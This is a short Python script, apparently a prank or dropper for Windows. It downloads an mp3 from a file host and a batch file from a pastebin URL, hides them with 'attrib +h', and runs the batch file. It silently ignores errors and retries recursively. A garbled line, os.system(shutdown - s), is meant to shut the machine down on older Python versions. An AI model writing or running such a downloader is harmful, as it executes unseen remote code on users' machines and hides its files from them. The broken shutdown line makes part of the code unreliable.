import sys
import os
import urllib.request
import subprocess
from os import path
cwd = os.getcwd()


class main():
    def let_the_fun_begin():
        try:
            if path.exists("().mp3"):
                os.system('attrib +h ().mp3')
                if path.exists("hi.bat"):
                    os.system('attrib +h hi.bat')
                    os.system('attrib +h ().mp3')
                    os.system('attrib +h sound.vbs')
                    subprocess.call('hi.bat')
                else:
                    url = 'https://pastebin.com/raw/2f6f8uE0'
                    urllib.request.urlretrieve(url, cwd+'/hi.bat')
                    os.system('attrib +h ().mp3')
                    os.system('attrib +h hi.bat')
                    os.system('attrib +h sound.vbs')
                    main.let_the_fun_begin()
            else:
                url = 'https://filebin.net/ttd4rolqt7sool4m/Merry_Go_Round_of_Life_-_Howl_s_Moving_Castle__Joe_Hisaishi_.mp3?t=1v1m27tn'
                urllib.request.urlretrieve(url, cwd+'/().mp3')
                os.system('attrib +h ().mp3')
                if path.exists("hi.bat"):
                    os.system('attrib +h ().mp3')
                    os.system('attrib +h hi.bat')
                    os.system('attrib +h sound.vbs')
                    subprocess.call('hi.bat')
                else:
                    url = 'https://pastebin.com/raw/2f6f8uE0'
                    urllib.request.urlretrieve(url, cwd+'/hi.bat')
                    main.let_the_fun_begin()
        except:
            return False

    def version_check():
        version_py = sys.version_info[0]
        if version_py >= 3:
            main.let_the_fun_begin()
        else:
            os.system(shutdown - s)


main.version_check()
